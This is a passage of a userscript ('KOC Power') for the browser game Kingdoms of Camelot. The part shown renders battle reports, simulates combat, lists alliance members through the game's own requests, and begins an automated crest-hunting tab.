						if (rslt['s0lifeBoost']!== undefined)
						 m+='<TR><TD colspan=4>'+culang.lifePoints+': ' + 100*rslt['s0lifeBoost'] + '%</TD></TR>';
						if (rslt['s0guardianDefBoost']!== undefined)
						 m+='<TR><TD colspan=4>'+culang.guardians+' ('+culang.def+' '+culang.boosted+'): ' + 100*rslt['s0guardianDefBoost'] + '%</TD></TR>';
						if (rslt['s0guardianAtkBoost']!== undefined)
			 m+='<TR><TD colspan=4>'+culang.guardians+' ('+culang.rptattack+' '+culang.boosted+'): ' + 100*rslt['s0guardianAtkBoost'] + '%</TD></TR>';
			if (rslt['rnds']!==undefined)
			   m+='<TR><TD colspan=4>'+culang.rounds+': ' + rslt['rnds'] + '</TD></TR>';
			if (rslt['fght']["s0"] != undefined) {
				m+='<TR><TH></TH><TH align=left>'+culang.troops+'</TH><TH align=right>'+culang.fighted+'</TH><TH align=right>'+culang.comeback+'</TH><TH align=right>'+culang.rptKilled+'</TH></TR>';
				for (var i=1;i<13;i++) {
					if (rslt['fght']["s0"]['u'+i] != undefined) {
						if (rslt['fght']["s0"]['u'+i][0] > rslt['fght']["s0"]['u'+i][1]) {
							perte_def= perte_def +(rslt['fght']["s0"]['u'+i][0] - rslt['fght']["s0"]['u'+i][1])*puipui[i-1];
							m+='<TR><TD>' + unitImg[i] + '</td>';
							m+='<TD align=right>'+addCommas(rslt['fght']["s0"]['u'+i][0])+'</td>';
							m+='<TD align=right><FONT color="#CC0000">'+addCommas(rslt['fght']["s0"]['u'+i][1])+'</FONT></td></tr>';
						} else {
							m+='<TR><TD>' + unitImg[i] + '</td>';
							m+='<TD align=right>'+addCommas(rslt['fght']["s0"]['u'+i][0])+'</td>';
							m+='<TD align=right>'+addCommas(rslt['fght']["s0"]['u'+i][1])+'</td></tr>';
						}
					}
				}
				// Dark Forest
							for (var i=101;i<111;i++) {
									if (rslt['fght']["s0"]['m'+i] != undefined) {
										if (rslt['fght']["s0"]['m'+i][0] > rslt['fght']["s0"]['m'+i][1]) {
											m+='<TR><TD>' + unitImg[i] + '</td>';
											m+='<TD align=right>'+addCommas(rslt['fght']["s0"]['m'+i][0])+'</td>';
											m+='<TD align=right><FONT color="#CC0000">'+addCommas(rslt['fght']["s0"]['m'+i][1])+'</FONT></td></tr>';
										} else {
											m+='<TR><TD>' + unitImg[i] + '</td>';
											m+='<TD align=right>'+addCommas(rslt['fght']["s0"]['m'+i][0])+'</td>';
											m+='<TD align=right>'+addCommas(rslt['fght']["s0"]['m'+i][1])+'</td></tr>';
										}
									}
				}
				//
				for (var i=53;i<=55;i++) {
					if (rslt['fght']["s0"]['f'+i] != undefined) {
						if (rslt['fght']["s0"]['f'+i][0] > rslt['fght']["s0"]['f'+i][1]) {
							perte_def= perte_def +(rslt['fght']["s0"]['f'+i][0] - rslt['fght']["s0"]['f'+i][1])*puipui[i];
							m+='<TR><TD>' + unitImg[i] + '</td>';
							m+='<TD align=right>'+addCommas(rslt['fght']["s0"]['f'+i][0])+'</td>';
							m+='<TD align=right><FONT color="#CC0000">'+addCommas(rslt['fght']["s0"]['f'+i][1])+'</font></td></tr>';
						} else {
							m+='<TR><TD>' + unitImg[i] + '</td>';
							m+='<TD align=right>'+addCommas(rslt['fght']["s0"]['f'+i][0])+'</td>';
							m+='<TD align=right>'+addCommas(rslt['fght']["s0"]['f'+i][1])+'</td></tr>';
						}
					}
				}
				for (var i=60;i<=63;i++) {
					if (rslt['fght']["s0"]['f'+i] != undefined) {
						if (rslt['fght']["s0"]['f'+i][0] > rslt['fght']["s0"]['f'+i][1]) {
							perte_def= perte_def +(rslt['fght']["s0"]['f'+i][0] - rslt['fght']["s0"]['f'+i][1])*puipui[i];
							m+='<TR><TD>' + unitImg[i] + '</td>';
							m+='<TD align=right>'+addCommas(rslt['fght']["s0"]['f'+i][0])+'</td>';
							m+='<TD align=right><FONT color="#CC0000">'+addCommas(rslt['fght']["s0"]['f'+i][1])+'</font></td></tr>';
						} else {
							m+='<TR><TD>' + unitImg[i] + '</td>';
							m+='<TD align=right>'+addCommas(rslt['fght']["s0"]['f'+i][0])+'</td>';
							m+='<TD align=right>'+addCommas(rslt['fght']["s0"]['f'+i][1])+'</td></tr>';
						}
					}
				}
			} else
				m+='<TR><TD><span class=boldGreen>'+culang.noDefense+'</span></TD></TR>';
			m+='</TABLE></TD></TR>';
			delta_perte = perte_atk - perte_def;
			delta_pos = 1;
			ordre_grandeur = 1; 
			delta_perte = delta_perte/1000;
			if (delta_perte<0){
				delta_pos = -1; 
				delta_perte = Math.abs(delta_perte);
			}
			if (delta_perte>1000) {
				ordre_grandeur = 2;
				delta_perte = entier_1dec(delta_perte/1000);
			}
			if (delta_perte<1) { 
				ordre_grandeur = 0;
				delta_perte = entier_1dec(delta_perte*1000);
			}
			if (ordre_grandeur == 1) {
				delta_perte = entier_1dec(delta_perte);
			}
			perte_atk = entier_1dec(perte_atk/1000);
			perte_def = entier_1dec(perte_def/1000);
			
			m+='<TR><TD colspan=4>&nbsp;</TD></TR>';
			if ((delta_pos == 1) && (delta_perte != 0)) {
				m+='<TR><TD><FONT color="#000"><b>'+culang.mightloose+'</b> ('+rpt.side1Name+') : </FONT><FONT color="#CC0000"> '+(perte_atk)+'k</FONT></TD><TD><FONT color="#00"><b>'+culang.mightloose+'</b> ('+rpt.side0Name+') : '+perte_def+'k </FONT></TD></TR>';
				if (ordre_grandeur==2) {
					m+='<TR><TD style="background-color: #FFFF00;"><FONT color="#ff00ff">'+culang.losses+':</FONT><FONT color="#CC0000"> '+delta_perte+'M</FONT></TD><TD></TD></TR></table>';
				} else if (ordre_grandeur==1){
					m+='<TR><TD style="background-color: #FFFF00;"><FONT color="#ff00ff">'+culang.losses+':</FONT><FONT color="#CC0000"> '+delta_perte+'k </FONT></TD><TD></TD></TR></table>';
				} else if(ordre_grandeur==0){
					m+='<TR><TD style="background-color: #FFFF00;"><FONT color="#ff00ff">'+culang.losses+':</FONT><FONT color="#CC0000"> '+delta_perte+'</FONT></TD><TD></TD></TR></table>';
				}
			}
			if ((delta_pos == -1) && (delta_perte != 0)) {
				m+='<TR><TD><FONT color="#000"><b>'+culang.mightloose+'</b> ('+rpt.side1Name+') : '+perte_atk+'k</FONT></TD><TD><FONT color="#000"><b>'+culang.mightloose+'</b> ('+rpt.side0Name+') : </FONT><FONT color="#CC0000"> '+perte_def+'k </FONT></TD></TR>';
				if (ordre_grandeur==2) {
					m+='<TR><TD></TD><TD style="background-color: #FFFF00;"><FONT color="#ff00ff">'+culang.losses+':</FONT><FONT color="#CC0000"> '+delta_perte+'M</FONT></TD></TR></table>';
				} else if (ordre_grandeur==1){
					m+='<TR><TD></TD><TD style="background-color: #FFFF00;"><FONT color="#ff00ff">'+culang.losses+':</FONT><FONT color="#CC0000"> '+delta_perte+'k</FONT></TD></TR></table>';
				} else if (ordre_grandeur==0){
					m+='<TR><TD style="background-color: #FFFF00;"><FONT color="#ff00ff">'+culang.losses+':</FONT><FONT color="#CC0000"> '+delta_perte+'</FONT></TD><TD></TD></TR></table>';
				}
			}
			if (delta_perte == 0 && (perte_def>0 || perte_atk>0)) {
				m+='<TR><TD><FONT color="#000"><b>'+culang.mightloose+'</b> ('+rpt.side1Name+') : '+perte_atk+'k</FONT></TD><TD><FONT color="#000"><b>'+culang.mightloose+'</b> ('+rpt.side0Name+') : '+perte_def+'k </FONT></TD></TR></TABLE>';		
			}
		}

		m+='</DIV>';
		t.popReport.getMainDiv().innerHTML = m;
		t.popReport.getTopDiv().innerHTML = '<DIV class=showBadged><center>'+rpt.marchName+' '+culang.shrreport+'</center></DIV>';
	        t.popReport.show(true);
    		t.popReport.autoHeight (true); 
	},

};
/****************************************************************************/
/************ KOC POWER - TABS COMBAT **************************************/
/**************************************************************************/
Tabs.Combat = {
    tabLabel: culang.combat,
	tabOrder: StyleOptions.toCombat,
	tabDisabled : StyleOptions.disCombatTab, 
	myDiv: null,
	troops: [{},{}], //Array[Defender, Attacker]
	active: [{},{}],
	lost: [{},{}],
	total: [],
	stats: unsafeWindow.unitstats,   //  Life, Attack, Defense, Speed, Range, Load
	priority: [12,10,6,3,7,8,4,5,2,1,9,11],
	round: 0,
	range: [0,0,0], //[Defender, Attacker, Max]
	distance: [{},{}], // [Defender, Attacker]
	speed: [0,0], // [Defender max, Attacker max]
	start: 0,

	init: function(div){
		var t = Tabs.Combat;
		t.myDiv = div;
		var m = '<div class=pdxStat>'+culang.HCTcal+'</div><table><TR><TD colspan=2><b>'+culang.attacking+'</b></td><TD colspan=2><b>'+culang.defending+'</b></td></TR>';
		for(var troops in unsafeWindow.unitcost){
			var name = unsafeWindow.unitcost[troops][0];
			m+='<tr><td>'+name+' :</td><td><input type=text id="pbcombata_'+troops+'" /></td><td>'+name+' :</td><td><input type=text id="pbcombatd_'+troops+'" /></td></tr>';
		}
		m+='</table><DIV id=pbcombat_rslt></div>';
		t.myDiv.innerHTML = m;
		
		for(var troops in unsafeWindow.unitcost){
			document.getElementById('pbcombata_'+troops).addEventListener('change', t.e_calculate, false);
			document.getElementById('pbcombatd_'+troops).addEventListener('change', t.e_calculate, false);
		}
	},
	
	e_calculate: function(){
		var t = Tabs.Combat;
		t.round = 0;
		t.total[0] = 0;
		t.total[1] = 0;
		t.range[0] = 0
		t.range[1] = 0;
		t.speed[0] = 0;
		t.speed[1] = 0;
		for(var tr in unsafeWindow.unitcost){
			var name = unsafeWindow.unitcost[tr][0];
			t.troops[0][tr] = parseIntNan(document.getElementById('pbcombatd_'+tr).value);
			t.troops[1][tr] = parseIntNan(document.getElementById('pbcombata_'+tr).value);
			t.total[0] += t.troops[0][tr];
			t.total[1] += t.troops[1][tr];
			t.lost[0][tr] = 0;
			t.lost[1][tr] = 0;
			t.active[0][tr] = 0;
			t.active[1][tr] = 0;
			if(t.troops[0][tr]>0 && parseInt(t.stats[tr][4]) > t.range[0]) t.range[0] = parseInt(t.stats[tr][4]);
			if(t.troops[1][tr]>0 && parseInt(t.stats[tr][4]) > t.range[1]) t.range[1] = parseInt(t.stats[tr][4]);
			if(t.troops[0][tr]>0 && parseInt(t.stats[tr][3]) > t.speed[0]) t.speed[0] = parseInt(t.stats[tr][3]);
			if(t.troops[1][tr]>0 && parseInt(t.stats[tr][3]) > t.speed[1]) t.speed[1] = parseInt(t.stats[tr][3]);
		}
		if(t.range[1]>t.range[0]){
			t.start = 1; //Attacker starts first if range is longer than defender
			t.range[2] = t.range[1];
		} else {
			t.start = 0;
			t.range[2] = t.range[0];
		}
		for(var tr in unsafeWindow.unitcost){
			if(t.troops[0][tr]>0)
				t.distance[0][tr] = parseInt(t.range[2]/((t.speed[1]/t.speed[0])+1));
			else
				t.distance[0][tr] = 0;
			if(t.troops[1][tr]>0)
				t.distance[1][tr] = parseInt(t.range[2]/((t.speed[0]/t.speed[1])+1));
			else
				t.distance[1][tr] = 0;
		}
		t.c_rounds();
	},
	
	c_rounds: function(){
		var t = Tabs.Combat;
		if(t.total[0]<1 || t.total[1]<1){
			t.print();
			return;
		}
		t.round++;
		if(t.round>1){
			for(var tr in t.distance[0]){
				t.distance[0][tr] -= t.stats[tr][3];
				if(t.distance[0][tr] < 1) t.distance[0][tr] = 0;
			}
			for(var tr in t.distance[1]){
				t.distance[1][tr] -= t.stats[tr][3];
				if(t.distance[1][tr] < 1) t.distance[1][tr] = 0;
			}
		}
		t.c_remainder();
	},
	
	c_remainder: function(){  //  Life, Attack, Defense, Speed, Range, Load
		var t = Tabs.Combat;
		for(var tr in t.troops[0]){ //Only troops in range are counted
			if(t.stats[tr][4] >= (t.distance[0][tr]))
				t.active[0][tr] = t.troops[0][tr];
		}
		for(var tr in t.troops[1]){
			if(t.stats[tr][4] >= (t.distance[1][tr]))
				t.active[1][tr] = t.troops[1][tr];
		}
		//Defender
		for(var tr in t.active[0]){
			if(t.active[0][tr] < 1) continue;
			var range = t.stats[tr][4] - t.distance[0][tr];
			// GM_log(range);
			var attack = t.c_attack(0,tr);
			// GM_log('range 0 '+attack);
			var count = 0;
			while(attack > 0 && count<t.priority.length){
				var trr = 'unt'+t.priority[count];
				if((t.troops[1][trr] < 1) || (range < t.distance[1][trr])){
					count++;
					continue;
				}
				// GM_log('1 '+tr);
				var defense = t.c_defense(1,trr);
				var life = t.c_life(1,trr);
				if((attack - parseInt(life+defense)) > 0){
					t.lost[1][trr] += t.troops[1][trr];
					t.total[1] -= t.troops[1][trr];
					t.troops[1][trr] = 0;
					attack -= parseInt(life+defense);
				} else {
					var killed = parseInt(attack/(t.stats[trr][0]+t.stats[trr][2]));
					// GM_log(t.active[1][tr]+' '+killed);
					t.lost[1][trr] += killed;
					t.troops[1][trr] -= killed;
					t.total[1] -= killed;
					attack = 0;
				}
				// GM_log(tr+' '+t.lost[1][tr]);
				count++;
			}
		}
		
		//Attacker
		for(var tr in t.active[1]){
			if(t.active[1][tr] < 1) continue;
		// GM_log(t.distance[1][tr]);
			var attack = t.c_attack(1,tr);
			var range = t.stats[tr][4] - t.distance[1][tr];
			// GM_log('range 1 '+attack);
			var count = 0;
			while(attack > 0 && count<t.priority.length){
				var trr = 'unt'+t.priority[count];
				if((t.troops[0][trr] < 1) || (range < t.distance[0][trr])){
					count++;
					continue;
				}
				// GM_log('1 '+tr);
				var defense = t.c_defense(0,trr);
				var life = t.c_life(0,trr);
				if((attack - parseInt(life+defense)) > 0){
					t.lost[0][trr] += t.troops[0][trr];
					t.total[0] -= t.troops[0][trr];
					t.troops[0][trr] = 0;
					attack -= parseInt(life+defense);
				} else {
					var killed = parseInt(attack/(t.stats[trr][0]+t.stats[trr][2]));
					GM_log(t.active[0][tr]+' '+killed);
					t.lost[0][trr] += killed;
					t.troops[0][trr] -= killed;
					t.total[0] -= killed;
					attack = 0;
				}
				// GM_log(tr+' '+t.lost[0][tr]);
				count++;
			}
		}
		t.c_rounds();
	},
	
	c_attack: function(side,tr){
		var t = Tabs.Combat;
		return parseInt(t.stats[tr][1] * t.active[side][tr]);
	},
	c_defense: function(side,tr){
		var t = Tabs.Combat;
		return parseInt(t.stats[tr][2] * t.troops[side][tr]);
	},
	c_life: function(side,tr){
		var t = Tabs.Combat;
		return parseInt(t.stats[tr][0] * t.troops[side][tr]);
	},
	
	print: function (){
		var t = Tabs.Combat;
		var m = '<div class=pdxStat>'+culang.Hresults+'</div><table><TR><TD colspan=2><b>'+culang.attacking+'</b></td><TD colspan=2><b>'+culang.defending+'</b></td><TD>'+culang.rounds+' :'+t.round+'</td></TR>';
		for(var tr in unsafeWindow.unitcost){
			var name = unsafeWindow.unitcost[tr][0];
			m+='<tr><td>'+name+' :</td><td>'+ t.troops[1][tr] +'</td><td>'+name+' :</td><td>'+ t.troops[0][tr] +'</td></tr>';
		}
		m+='</table>';
		document.getElementById('pbcombat_rslt').innerHTML = m;
	},
	show: function(){
	
	},
	
	hide: function(){
	
	},
}

/****************************************************************************/
/************ KOC POWER - TABS ALLIANCE ************************************/
/**************************************************************************/
Tabs.Alliance = {
  tabLabel : culang.alliance,
  tabOrder : StyleOptions.toAllianz,
  myDiv : null,
  alliancemembers:[],
  number:0,
  totalmembers:0,
  error:false,
  
  init : function (div){    
    var t = Tabs.Alliance;      
    t.myDiv = div;
     t.myDiv.style.overflowY = 'auto';
     div.style.maxHeight = '500px';
     t.totalmembers=0;
     t.alliancemembers=[];  
     
     unsafeWindow.getdetails = t.getMemberDetails;
    var m =  '<DIV class=pdxStat>'+culang.Halliance+'</div><span style=\"font-size:10px; color:#555; line-height:18px; \"><font color=#600000><B><u>'+culang.impnote+'</u></b></font>: '+culang.dipImpNote+'</span><TABLE align=center cellpadding=1 cellspacing=0></table>';
    m +='<TABLE class=pdxTab><TD width=200px><INPUT id=aldiplo type=submit value="'+culang.diplo+' '+culang.show+'"></td><TD>'+culang.sort+':<select id="searchAlli"><option value="name">'+culang.name+'</options><option value="might">'+culang.might+'</option><option value="glory">'+culang.glory+'</option><option value="login">'+culang.lastlogin2+'</option><option value="cities">'+culang.cities+'</option><option value="position">'+culang.pos+'</option><option value="dip">'+culang.dip+'</option></select></td><TD><INPUT id=alList type=submit value="'+culang.show+'"></td><TD id=progress></td>';
    m+='<TABLE align=center cellpadding=1 cellspacing=0></table><TABLE id=alOverviewTab class=alTab><TR align="center"></tr></table>';
    
    t.myDiv.innerHTML = m;
    
    document.getElementById('alList').addEventListener('click', function(){
      if (!t.searching){
        t.totalmembers=0;
        t.alliancemembers=[];  
        document.getElementById('alOverviewTab').innerHTML ="";
        document.getElementById('progress').innerHTML ="";
        document.getElementById('progress').innerHTML = "Durchsuche...";
        document.getElementById('alList').disabled = true;
        t.error=false;
        t.fetchAllianceMemberPage();
    }
    }, false);
    document.getElementById('searchAlli').addEventListener('click', function(){
        if (t.alliancemembers!="") {
          document.getElementById('alOverviewTab').innerHTML ="";
          t.paintMembers();
        }
    }, false);
    document.getElementById('aldiplo').addEventListener('click', function(){t.paintDiplomacy();}, false);  
    
  window.addEventListener('unload', t.onUnload, false);
  },
  
  paintMembers: function(){
  var t = Tabs.Alliance;
          if (document.getElementById('searchAlli').value == "name") {
          var sortmembers = t.alliancemembers.sort(function(a, b){
                 var sortA=a.Name.toLowerCase(), sortB=b.Name.toLowerCase()
                 if (sortA < sortB)
                  return -1
                 if (sortA > sortB)
                  return 1
                 return 0
                });
        }     
        if (document.getElementById('searchAlli').value == "might") {
            var sortmembers = t.alliancemembers.sort(function(a, b){
                   var sortA=parseInt(a.Might),sortB=parseInt(b.Might)
                   if (sortA > sortB)
                    return -1
                   if (sortA < sortB)
                    return 1
                   return 0
                  });
        }
		        if (document.getElementById('searchAlli').value == "glory") {
            var sortmembers = t.alliancemembers.sort(function(a, b){
                   var sortA=parseInt(a.glory),sortB=parseInt(b.glory)
                   if (sortA > sortB)
                    return -1
                   if (sortA < sortB)
                    return 1
                   return 0
                  });
        }    
        if (document.getElementById('searchAlli').value == "login") {
            var sortmembers = t.alliancemembers.sort(function(a, b){
                   var sortA=a.LastLogin,sortB=b.LastLogin
                   if (sortA < sortB)
                    return -1
                   if (sortA > sortB)
                    return 1
                   return 0
                  });
        }     
        if (document.getElementById('searchAlli').value == "cities") {
            var sortmembers = t.alliancemembers.sort(function(a, b){
                   var sortA=a.Cities,sortB=b.Cities
                   if (sortA < sortB)
                    return -1
                   if (sortA > sortB)
                    return 1
                   return 0
                  });
        }     
        if (document.getElementById('searchAlli').value == "dip") {
            var sortmembers = t.alliancemembers.sort(function(a, b){
                   var sortA=a.dip,sortB=b.dip
                   if (sortA < sortB)
                    return -1
                   if (sortA > sortB)
                    return 1
                   return 0
                  });
        }     
        if (document.getElementById('searchAlli').value == "position") {
            var sortmembers = t.alliancemembers.sort(function(a, b){
                   var sortA=a.Position,sortB=b.Position
                   if (sortA < sortB)
                    return -1
                   if (sortA > sortB)
                    return 1
                   return 0
                  });
        }      
        for (var y = (sortmembers.length-1); y >=0; y--) {
                            t._addTab(sortmembers[y].Name,sortmembers[y].Might,sortmembers[y].LastLogin,sortmembers[y].Position,sortmembers[y].dip,sortmembers[y].uid,sortmembers[y].fbuid,sortmembers[y].Cities,sortmembers[y].avatarurl,sortmembers[y].glory,sortmembers[y].dateJoined);
                            t.myDiv.style.overflowY = 'scroll';
        }
       t._addTabHeader();
   },
  
    _addTab: function(Name,Might,LastLogin,Position,dip,uid,fbuid,Cities,avatar,glory,arrive){
	var t = Tabs.Alliance;
	var row = document.getElementById('alOverviewTab').insertRow(0);
		row.vAlign = 'top';
		row.insertCell(0).innerHTML ='<img width=25 src="'+ avatar +'">';
		row.insertCell(1).innerHTML ='<A target="_tab" href="http://www.facebook.com/profile.php?id='+ fbuid +'">'+culang.profile+'</a>';
		row.insertCell(2).innerHTML = Name;
		var cell2 = row.insertCell(3); 
		cell2.width = "60" ;
		cell2.align = "right" ;
		cell2.vAlign = "top";
		cell2.innerHTML = addCommas(Might);
		var cell2 = row.insertCell(4);
		cell2.width = "60" ;
		cell2.align = "right" ;
		cell2.vAlign = "top";
		cell2.innerHTML = addCommas(glory);
		row.insertCell(5).innerHTML = Cities;
		row.insertCell(6).innerHTML = officerId2String (Position);
		row.insertCell(7).innerHTML = dip;
		row.insertCell(8).innerHTML = LastLogin;
		row.insertCell(9).innerHTML = arrive; 
        },
          
    _addTabHeader: function() {
	var t = Tabs.Alliance;
	var row = document.getElementById('alOverviewTab').insertRow(0);
		row.vAlign = 'top';
		row.insertCell(0).innerHTML = "<u><b>"+culang.avatar+"</b></u>";
		row.insertCell(1).innerHTML = "<u><b>Facebook</b></u>";
		row.insertCell(2).innerHTML = "<u><b>"+culang.name+"</b></u>";
		row.insertCell(3).innerHTML = "<u><b>"+culang.might+"</b></u>";
		row.insertCell(4).innerHTML = "<u><b>"+culang.glory+"</b></u>";
		row.insertCell(5).innerHTML = "<u><b>"+culang.cities+"</b></u>";
		row.insertCell(6).innerHTML = "<u><b>"+culang.pos+"</b></u>";
		row.insertCell(7).innerHTML = "<u><b>"+culang.Hdip+"</b></u>";
		row.insertCell(8).innerHTML = "<u><b>"+culang.lastlogin2+"</b></u>";
		row.insertCell(9).innerHTML = "<u><b>"+culang.create+"</b></u>";
      },   

   paintDiplomacy : function () {
		var allianceName = '';
		var membersCount = '';
		document.getElementById('alOverviewTab').innerHTML ='';

		var m = '<CENTER><TABLE class=xtab><TR><TD valign=top><TABLE class=xtab><TR><TD colspan=2 style=\'background: #33CC66;\' align=center><B>'+culang.friendly+'</B></TD></TR>';
		m += ((Seed.allianceDiplomacies['friendly'] == null)?'<TR><TD colspan=2>'+culang.nofriendlyallys+'</TD></TR>':'<TR><TD><B>'+culang.alliance+' '+culang.name+'</B></TD><TD><B>'+culang.player+'</B></TD></TR>');
		for (k in Seed.allianceDiplomacies['friendly']){
			allianceName = Seed.allianceDiplomacies['friendly'][k]['allianceName'];
			membersCount = parseInt(Seed.allianceDiplomacies['friendly'][k]['membersCount']);
			if (membersCount > 0)
				m += '<TR><TD>' + allianceName + '</TD><TD align=right>' + membersCount + '</TD></TR>';
		}
		m += '</TABLE></TD><TD valign=top><TABLE class=xtab><TR><TD colspan=2 style=\'background: #FF6633;\' align=center><B>'+culang.Hfriendlyto+'</B></TD></TR>';
		m += ((Seed.allianceDiplomacies['friendlyToThem'] == null)?'<TR><TD colspan=2>'+culang.nofriendlyset+'</TD></TR>':'<TR><TD><B>'+culang.alliance+' '+culang.name+'</B></TD><TD><B>'+culang.player+'</B></TD></TR>');
		for (k in Seed.allianceDiplomacies['friendlyToThem']){
			allianceName = Seed.allianceDiplomacies['friendlyToThem'][k]['allianceName'];
			membersCount = parseInt(Seed.allianceDiplomacies['friendlyToThem'][k]['membersCount']);
			if (membersCount > 0)
				m += '<TR><TD>' + allianceName + '</TD><TD align=right>' + membersCount + '</TD></TR>';
		}
		m += '<TR><TD colspan=2 style=\'background: #FF6633;\' align=center><B>'+culang.Hfriendlytoy+'</B></TD></TR>';
		m += ((Seed.allianceDiplomacies['friendlyToYou'] == null)?'<TR><TD colspan=2>'+culang.nofriendlys+'</TD></TR>':'<TR><TD><B>'+culang.alliance+' '+culang.name+'</B></TD><TD><B>'+culang.player+'</B></TD></TR>');
		for (k in Seed.allianceDiplomacies['friendlyToYou']){
			allianceName = Seed.allianceDiplomacies['friendlyToYou'][k]['allianceName'];
			membersCount = parseInt(Seed.allianceDiplomacies['friendlyToYou'][k]['membersCount']);
			if (membersCount > 0)
				m += '<TR><TD>' + allianceName + '</TD><TD align=right>' + membersCount + '</TD></TR>';
		}
		m += '</TABLE></TD><TD valign=top><TABLE class=xtab><TR><TD colspan=2 style=\'background: #CC0033;\' align=center><B>'+culang.hostile+':</B></TD></TR>';
		m += ((Seed.allianceDiplomacies['hostile'] == null)?'<TR><TD colspan=2><b>'+culang.nohost+'</b></TD></TR>':'<TR><TD><B>'+culang.alliance+' '+culang.name+'</B></TD><TD><B>'+culang.player+'</B></TD></TR>');
		for (k in Seed.allianceDiplomacies['hostile']){
			allianceName = Seed.allianceDiplomacies['hostile'][k]['allianceName'];
			membersCount = parseInt(Seed.allianceDiplomacies['hostile'][k]['membersCount']);
			if (membersCount > 0)
				m += '<TR><TD>' + allianceName + '</TD><TD align=right>' + membersCount + '</TD></TR>';
		}
		m += '</TABLE></TD></TR></TABLE></CENTER>';
		document.getElementById('alOverviewTab').innerHTML = m;
	},

    fetchAllianceMemberPage : function () {
    var t = Tabs.Alliance;
    document.getElementById('alList').disabled = true;
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    
    params.pf = 0;
    
    new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/allianceGetInfo.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (transport) {
          var rslt = eval("(" + transport.responseText + ")");
          t.totalmembers = (rslt["allianceInfo"]["members"]);
          for (var i=1;i<=10;i++) {
                 params.pageNo = i;
                 params.pf = 0;
                 new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/allianceGetMembersInfo.php" + unsafeWindow.g_ajaxsuffix, {
                   method: "post",
                   parameters: params,
                   onSuccess: function (transport) {
                    var info = eval("(" + transport.responseText + ")");
                    if (info.ok) {  
                       for (var k in info["memberInfo"]){
                         if ( info["memberInfo"][k]["might"] != undefined && !t.error){  
                           t.alliancemembers.push ({
                               Name: info["memberInfo"][k]["name"],
                               Might: info["memberInfo"][k]["might"],
                               Cities: info["memberInfo"][k]["cities"],
                               Position : info["memberInfo"][k]["positionType"],
                               dip : info["memberInfo"][k]["daysInPosition"],
                               LastLogin : info["memberInfo"][k]["lastLogin"],
                               uid : info["memberInfo"][k]["userId"],
                               fbuid : info["memberInfo"][k]["fbuid"],
							   avatarurl : info["memberInfo"][k]["avatarurl"],
							   glory : info["memberInfo"][k]["glory"],
							   dateJoined : info["memberInfo"][k]["dateJoined"], 
                           });
                          }
                           document.getElementById('alOverviewTab').innerHTML ="";
                           t.paintMembers();
                       }
                       if (!t.error) document.getElementById('progress').innerHTML   = '(' + (t.alliancemembers.length) +' '+culang.from+' '+ t.totalmembers +')';
                       if ( t.alliancemembers.length >= t.totalmembers) document.getElementById('alList').disabled = false;
                    } else  if (info.error) {
                      document.getElementById('alList').disabled = false;
                      document.getElementById('progress').innerHTML = ""+culang.Herror+"!";
                      t.error=true;
                     }
                   },
                   onFailure: function (rslt) {;
                     notify ({errorMsg:'AJAX error'});
                   },
                   
           });
          }
      },
      onFailure: function (rslt) {;
        notify ({errorMsg:'AJAX error'});
      },
    });
  },
  
  hide : function (){
  var t = Tabs.Alliance;
	mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },

  show : function (){         
      var t = Tabs.Alliance;
      mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },
};
/********************************* Koordinaten Hide/Show */
function pdxkoordlink (x, y){
  var m = [];
  m.push ('(<a title="'+culang.gotoCoord+'" onclick="pdxGotoMapHide (');
  m.push (x);
  m.push (',');
  m.push (y);
  m.push ('); return false">');
  m.push (x);
  m.push (',');
  m.push (y);
  m.push ('</a>)');  
  return m.join('');
}
unsafeWindow.pdxGotoMapHide = function (x, y){
  try {
    unsafeWindow.Modal.hideModal();
  } catch (e){ }
  try {
    Modal.hideModal();
  } catch (e){ }
  unsafeWindow.pdxGotoMap (x, y);  
}

unsafeWindow.pdxGotoMap = function (x, y){
  if (Options.hideOnGoto)
    hideMe ();
  setTimeout (function (){
    document.getElementById('mapXCoor').value = x;
    document.getElementById('mapYCoor').value = y;
    unsafeWindow.reCenterMapWithCoor();
    var a = document.getElementById("mod_views").getElementsByTagName("a");
    for (var b = 0; b < a.length; b++) {
        a[b].className = ""
    }
    document.getElementById('mod_views_map').className = "sel";
    document.getElementById("maparea_city").style.display = 'none';
    document.getElementById("maparea_fields").style.display = 'none';
    document.getElementById("maparea_map").style.display = 'block';
    unsafeWindow.tutorialClear()
  }, 0);
};
/***********************************************************************************/
/************ KOC POWER - TABS CREST **********************************************/
/*********************************************************************************/  
 Tabs.Crest = {
  tabLabel : culang.crest,
  tabOrder : StyleOptions.toWappen,
  myDiv : null,
  rallypointlevel:null,
  error_code: 0,
  knt:{},
     
  init : function (div){
    var t = Tabs.Crest;
    // setInterval(t.FirstRound,10000);
    setInterval(t.sendCrestReport, 1*60*1000);
    setTimeout(function(){ t.Rounds(1,0);}, 5*1000);
    t.myDiv = div;
    var selbut=0;
    var m = '<DIV id=pbTowrtDivF class=pdxStat>'+culang.HcrestS+'</div><TABLE id=pbcrestfunctions width=100% height=0% class=pdxTab><TR align="center">';
     if (CrestOptions.Running == false) {
	       m += '<TD><INPUT id=Cresttoggle type=submit value="'+culang.crest+' = '+culang.buttonoff+'"></td>';
	   } else {
	       m += '<TD><INPUT id=Cresttoggle type=submit value="'+culang.crest+' = '+culang.buttonon+'"></td>';
	   }
    m += '<TD><INPUT id=CrestHelp type=submit value="'+culang.helpbutton+'"></td>';
    m += '<TD><INPUT id=pbsendcrestreport type=checkbox '+ (Options.crestreport?' CHECKED':'') +'\> '+culang.sendcrestrpt+' ';
    m += '<INPUT id=pbsendcrestreportint value='+ Options.CrestMsgInterval +' type=text size=3 \> '+culang.sendcrestrpt2+' </td></table>';
    
    m += '<DIV id=pbOpt class=pdxStat>'+culang.HcrestS+' - '+culang.Hsettings+'</div><TABLE id=pbcrestopt	 width=100% height=0% class=pdxTab><TR align="center"></table>';
    m += '<DIV style="margin-bottom:10px;"><b>'+culang.holyplace+'</b>: <span id=crestcity></span></div>';
    
    m += '<TABLE class=pdxTab><TR><TD><b>'+culang.wild+'</b>: X: <INPUT id=pbcrestx type=text size=3 maxlength=3 value="'+CrestOptions.X+'"</td>';
